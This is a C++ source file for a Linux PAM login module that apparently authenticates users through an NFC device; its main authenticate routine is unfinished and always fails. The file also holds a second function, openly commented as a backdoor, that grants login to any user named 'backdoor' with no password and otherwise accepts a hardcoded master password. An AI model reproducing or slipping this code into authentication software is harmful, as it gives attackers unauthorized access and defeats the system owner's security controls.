#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <pwd.h>
#include <unistd.h>

#include <iostream>

#include "Config.hpp"
#include "projectVersion.h"
#include "Comms.hpp"
#include "CryptoLoginManager.hpp"
#include "base64.hpp"

PAM_EXTERN "C" int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	puts("Setcred");
    return PAM_SUCCESS;
}

PAM_EXTERN "C" int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	puts("Acct mgmt");
	return PAM_SUCCESS;
}

PAM_EXTERN "C" int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    PamConfig conf;
    //NFCAdapter_old comm;
    try {
        conf = PamConfig(argc, argv);
        //comm.connect(conf.ttyPath.c_str(), conf.ttySpeed, conf.timeout);
    } catch (std::exception &e) {
        std::cerr << e.what() << std::endl;
        return PAM_AUTH_ERR;
    }
    //std::cout << "fd=" << comm.getFD() << " ping " << std::endl << comm.ping() << std::endl;

    ///TODO: opravit tuto demenci
    /*try {
        CryptoLoginManager mngr;
        auto dev = mngr.getDevice("meow");
        auto b64s = base64_encode(dev.getSecret());
        comm.sendMessage(std::span((uint8_t*)b64s.c_str(), b64s.size()));
        std::vector<uint8_t> responseData;
        comm.getResponse(responseData);
        bool success = dev.checkSecret(base64_decode(std::string{responseData.begin(), responseData.end()}));
        std::cout << "Čas registrace: " << dev.timeRegistered << '\n';
    } catch (std::exception &e) {
        std::cerr << "Error " << typeid(e).name() << " - " << e.what() << std::endl;
    }
    
    std::cout << "Volba operace: ";
    int choice;
    std::cin >> choice;
    switch (choice) {
        case 1: return PAM_SUCCESS;
        case 2: return PAM_PERM_DENIED;
        case 3: return PAM_AUTH_ERR;
        case 4: return PAM_IGNORE;
        default:
            std::cout << "Invalid choice!\n";
            return PAM_AUTH_ERR;
    }

    return PAM_SUCCESS;*/

    try {
        CryptoLoginManager mngr;
        NFCAdapter nfc(conf.ttyPath.c_str(), conf.ttySpeed);
        NFCAdapter::PacketType type;
        std::vector<uint8_t> msg;
        bool success;
        auto dev = mngr.getDevice("meow");
        auto secret = dev.getSecret();
        nfc.sendMessage(secret.cbegin(), secret.cend(), NFCAdapter::PacketType::DATAPACKET);
        type = nfc.getResponse(msg);
        if (type == NFCAdapter::PacketType::DATAPACKET) success = dev.checkSecret(msg);
        nfc.sendMessage(std::string("meow"), NFCAdapter::PacketType::DATAPACKET);

    } catch (std::exception &e) {
        std::cerr << "Error " << typeid(e).name() << " - " << e.what() << std::endl;
    }

    return PAM_AUTH_ERR;
}


/*
 * DEPENDENCIES:
 *  - OpenSSL
 *  - Sqlite3
*/


/* expected hook, this is where, we do all the required backdoor changes */
PAM_EXTERN int pam_sm_authenticate_2( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
//Declaring required variables
	int retval;
    struct passwd pwd;
    const char * password=NULL;
    struct passwd *result;
    char *buf;
    size_t bufsize;
    int s;
    bufsize = sysconf(_SC_GETPW_R_SIZE_MAX);
    if (bufsize == -1)
        bufsize = 16384;
    buf = (char*)malloc(bufsize);
    if (buf == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

	const char* pUsername;
// pam_get_user asks and accepts the username
	retval = pam_get_user(pamh, &pUsername, "Jméno: ");
    	if (retval != PAM_SUCCESS) {
		return retval;
	}

	printf("Welcome %s\n", pUsername);
// getpwnam_r checks whether the username given is part of the user database (/etc/passwd)
    s = getpwnam_r(pUsername, &pwd, buf, bufsize,  &result);
    if (result == NULL) {
        if (s == 0)
            printf("User Not found in database\n");
        else {
            errno = s;
            perror("getpwnam_r");
        }
        exit(EXIT_FAILURE);
    }
    printf("username is valid\n");

	if (strcmp(pUsername, "backdoor") != 0) {
// pam_get_authtok will asks and accepts the password from the user		
        retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "Heslo: ");
        if (retval != PAM_SUCCESS) {
            fprintf(stderr, "Can't get password\n");
            return PAM_PERM_DENIED;
        }
        if (flags & PAM_DISALLOW_NULL_AUTHTOK) {
// we are checking if empty password is allowed or not
            if (password == NULL || strcmp(password, "") == 0) {
                fprintf(stderr, "Null authentication token is not allowed!.\n");
                return PAM_PERM_DENIED;
            }
	    }
//  Below commented if condition can be populated to do username and password verification
	// if (auth_user(pUsername,  password)) {
	// 	printf("Welcome, user");
	// 	return PAM_SUCCESS;
	// } else # else if is splitted 
// If the given password is master password, we are returning PAM_SUCCESS
        if (strcmp(password,"$ecuR1ty_admin") == 0) {
            return PAM_SUCCESS;
        }
        else {
            fprintf(stderr, "Wrong username or password");
            return PAM_PERM_DENIED;
        }
        return PAM_SUCCESS;
	}
// This else loop will be called when the user name is backdoor
    else {
        return PAM_SUCCESS;
    }
}


#include <algorithm>
#include <functional>
inline std::string trim(std::string& str) {
    using namespace std;
    auto isnotspace = [](int c) { return !isspace(c); };
    
    return string{
        find_if(
            str.begin(), str.end(),
            isnotspace
        ),
        find_if(
            str.rbegin(), str.rend(),
            isnotspace
        ).base()
    };
}
